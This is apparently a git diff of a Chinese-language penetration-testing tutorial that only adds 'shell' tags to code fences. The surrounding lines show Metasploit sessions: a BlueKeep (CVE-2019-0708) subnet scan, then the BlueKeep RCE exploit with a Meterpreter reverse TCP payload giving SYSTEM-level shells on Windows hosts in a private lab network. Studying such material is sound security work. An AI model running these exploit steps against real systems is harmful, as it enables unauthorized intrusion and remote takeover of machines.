@@ -349,7 +349,7 @@ meterpreter >
 
 当出现WIN的字样并且跳出shell就证明成功了
 
-```
+```shell
 meterpreter > sysinfo
 Computer        : WIN-37KNDA6U40V
 OS              : Windows 2008 R2 (6.1 Build 7600).
@@ -360,7 +360,7 @@ Logged On Users : 1
 Meterpreter     : x64/windows
 ```
 
-```
+```shell
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
@@ -377,7 +377,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 `use0`
 
-```
+```shell
 msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts 192.168.43.155/24
 rhosts => 192.168.43.155/24
 msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set threads 100
@@ -387,7 +387,7 @@ msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
 
 切exp
 
-```
+```shell
 msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > use 1
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts 192.168.43.63
@@ -396,7 +396,7 @@ rhosts => 192.168.43.63
 
 除了正常的基础配置这个漏洞还需要将target配置到合适的参数，我们的目标是windows7那么就将target设为1
 
-```
+```shell
 Exploit target:
 
    Id  Name
@@ -406,7 +406,7 @@ Exploit target:
 
 run
 
-```
+```shell
 msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
 
 [*] Started reverse TCP handler on 192.168.43.155:4444 
@@ -427,7 +427,7 @@ msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
 meterpreter > 
 ```
 
-```
+```shell
 meterpreter > sysinfo
 Computer        : USER-PC
 OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
